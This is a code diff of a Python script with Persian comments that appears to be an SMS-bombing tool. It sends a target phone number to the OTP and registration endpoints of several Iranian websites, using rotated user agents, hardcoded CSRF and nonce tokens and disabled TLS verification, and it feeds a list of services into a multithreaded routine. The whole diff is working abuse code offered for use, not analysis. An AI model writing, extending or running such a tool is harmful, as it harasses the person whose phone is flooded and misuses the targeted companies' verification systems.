@@ -64,132 +64,6 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
-
-def Lendo(phone):
-    try:
-        url = "https://api2.lendo.ir/api/customer/auth/send-otp"
-        
-        # فرمت شماره
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"
-        
-        # تولید timestamp
-        timestamp = str(int(time.time() * 1000))
-        
-        # محاسبه signature (sha)
-        # این قسمت نیاز به کلید secret دارد که از سایت باید استخراج شود
-        # فعلاً از signature ثابت استفاده می‌کنیم
-        signature = "suoFyEBf+aqzIwx82ArDq3BdwxHUuj6mkkzuO3TSK495B//J+4Yf4yTh0c7BNcAfkED0tRBB8vYryDiO8dxb+w=="
-        
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "sha": f"SIGN {signature}",
-            "X-Timestamp": timestamp,
-            "User-Agent": random.choice(user_agents),
-            "Origin": "https://lendo.ir",
-            "Referer": "https://lendo.ir/",
-        }
-        
-        payload = {
-            "mobile": formatted_phone
-        }
-        
-        response = requests.post(
-            url, 
-            json=payload, 
-            headers=headers, 
-            timeout=10
-        )
-        
-        print(f'{y}[Debug] Lendo Status: {response.status_code}{a}')
-        print(f'{y}[Debug] Lendo Response: {response.text}{a}')
-        
-        if response.status_code in [200, 201, 202]:
-            try:
-                data = response.json()
-                if data.get("success") or data.get("status") == "success":
-                    print(f'{g}(Lendo) Code Sent{a}')
-                    return True
-                else:
-                    print(f'{r}[-] Lendo Failed: {data.get("message", "Unknown error")}{a}')
-                    return False
-            except:
-                if "success" in response.text.lower() or "sent" in response.text.lower():
-                    print(f'{g}(Lendo) Code Sent{a}')
-                    return True
-                return False
-        else:
-            print(f'{r}[-] Lendo HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] Lendo Exception: {e}{a}')
-        return False
-
-def Footini(phone):
-    try:
-        session = requests.Session()
-        
-        # دریافت صفحه اصلی
-        home_response = session.get(
-            "https://footini.ir/",
-            headers={"User-Agent": random.choice(user_agents)},
-            timeout=10
-        )
-        
-        # استخراج توکن‌ها
-        instance_id_match = re.search(r'name="instance_id" value="([^"]+)"', home_response.text)
-        digits_form_match = re.search(r'name="digits_form" value="([^"]+)"', home_response.text)
-        
-        instance_id = instance_id_match.group(1) if instance_id_match else "default_instance_id"
-        digits_form = digits_form_match.group(1) if digits_form_match else "default_digits_form"
-        
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        
-        payload = {
-            "digt_countrycode": "+98",
-            "phone": formatted_phone,
-            "digits_reg_name": "نام",
-            "digits_reg_username": f"user{random.randint(10000, 99999)}",
-            "digits_reg_password": f"Pass{random.randint(1000, 9999)}",
-            "digits_process_register": "1",
-            "instance_id": instance_id,
-            "action": "digits_forms_ajax",
-            "type": "register",
-            "digits": "1",
-            "digits_form": digits_form,
-        }
-        
-        headers = {
-            "User-Agent": random.choice(user_agents),
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://footini.ir",
-            "Referer": "https://footini.ir/",
-        }
-        
-        response = session.post(
-            "https://footini.ir/wp-admin/admin-ajax.php",
-            data=payload,
-            headers=headers,
-            timeout=10
-        )
-        
-        print(f'{y}[Debug] Footini Status: {response.status_code}{a}')
-        print(f'{y}[Debug] Footini Response: {response.text}{a}')
-        
-        if response.status_code == 200:
-            print(f'{g}(Footini) Code Sent{a}')
-            return True
-        else:
-            print(f'{r}[-] Footini HTTP Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] Footini Exception: {e}{a}')
-        return False
-
 def SibApp(phone):
     try:
         url = "https://api.sibapp.net/api/v1/action"
@@ -220,16 +94,13 @@ def SibApp(phone):
             "User-Agent": random.choice(user_agents),
         }
         
-        response = requests.post(url, json=payload, headers=headers, timeout=10)
-        
-        print(f'{y}[Debug] SibApp Status: {response.status_code}{a}')
-        print(f'{y}[Debug] SibApp Response: {response.text}{a}')
+        response = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
         
         if response.status_code in [200, 201]:
-            print(f'{g}(SibApp) Code Sent{a}')
+            print(f'{g}(SibApp) Request Successful - SMS Should be Sent{a}')
             return True
         else:
-            print(f'{r}[-] SibApp HTTP Error: {response.status_code}{a}')
+            print(f'{r}[-] SibApp Error: {response.status_code} - {response.text}{a}')
             return False
             
     except Exception as e:
@@ -238,38 +109,19 @@ def SibApp(phone):
 
 def nillarayeshi(phone):
     try:
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         session = requests.Session()
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         
-        home_response = session.get(
-            "https://nillarayeshi.com/", 
-            timeout=10, 
-            headers={"User-Agent": random.choice(user_agents)}
-        )
-        home_response.encoding = 'utf-8'
-        
-        # دیباگ: ببینیم چه چیزی در صفحه هست
-        print(f'{y}[Debug] Page content: {home_response.text[:200]}...{a}')
-        
-        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
-        nonce_match = re.search(r'name="dig_nounce" value="([^"]+)"', home_response.text)
-        
-        csrf = csrf_match.group(1) if csrf_match else ""
-        nonce = nonce_match.group(1) if nonce_match else ""
-        
-        if not csrf or not nonce:
-            print(f'{r}[-] nillarayeshi: Could not extract tokens{a}')
-            return False
-        
+        # استفاده از مقادیر ثابت
         payload = {
             "action": "digits_check_mob",
             "countrycode": "+98",
             "mobileNo": formatted_phone,
-            "csrf": csrf,
+            "csrf": "b77d25383c",
             "login": "2",
             "digits": "1",
             "json": "1",
-            "dig_nounce": nonce
+            "dig_nounce": "b77d25383c"
         }
         
         headers = {
@@ -277,35 +129,84 @@ def nillarayeshi(phone):
             "Content-Type": "application/x-www-form-urlencoded",
             "X-Requested-With": "XMLHttpRequest",
             "Origin": "https://nillarayeshi.com",
-            "Referer": "https://nillarayeshi.com/",
         }
         
         response = session.post(
             "https://nillarayeshi.com/wp-admin/admin-ajax.php",
             data=payload,
             headers=headers,
-            timeout=10
+            timeout=10,
+            verify=False
         )
         
-        print(f'{y}[Debug] nillarayeshi Status: {response.status_code}{a}')
-        print(f'{y}[Debug] nillarayeshi Response: {response.text}{a}')
-        
         if response.status_code == 200:
-            if "success" in response.text.lower() or "1" in response.text:
-                print(f'{g}(nillarayeshi) Code Sent{a}')
-                return True
-        return False
+            print(f'{g}(nillarayeshi) Request Successful - SMS Should be Sent{a}')
+            return True
+        else:
+            print(f'{r}[-] nillarayeshi Error: {response.status_code}{a}')
+            return False
             
     except Exception as e:
         print(f"{r}[!] nillarayeshi Exception: {e}{a}")
         return False
 
+def Footini(phone):
+    try:
+        session = requests.Session()
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        payload = {
+            "digt_countrycode": "+98",
+            "phone": formatted_phone,
+            "digits_reg_name": "نام",
+            "digits_reg_username": f"user{random.randint(10000, 99999)}",
+            "digits_reg_password": f"Pass{random.randint(1000, 9999)}",
+            "digits_process_register": "1",
+            "instance_id": "de6bca2e4448c81c7733fa67a04f5594",
+            "action": "digits_forms_ajax",
+            "type": "register",
+            "digits": "1",
+            "digits_form": "09819c58fd",
+        }
+        
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Requested-With": "XMLHttpRequest",
+        }
+        
+        response = session.post(
+            "https://footini.ir/wp-admin/admin-ajax.php",
+            data=payload,
+            headers=headers,
+            timeout=15,
+            verify=False
+        )
+        
+        if response.status_code == 200:
+            print(f'{g}(Footini) Request Successful - SMS Should be Sent{a}')
+            return True
+        else:
+            print(f'{r}[-] Footini Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] Footini Exception: {e}{a}')
+        return False
+
+def Lendo(phone):
+    try:
+        print(f'{y}[!] Lendo: Requires digital signature, skipping...{a}')
+        return False
+    except Exception as e:
+        print(f'{r}[!] Lendo Exception: {e}{a}')
+        return False
 
         
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [ Footini, Lendo, nillarayeshi, SibApp]
+services = [ Footini, nillarayeshi, SibApp]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
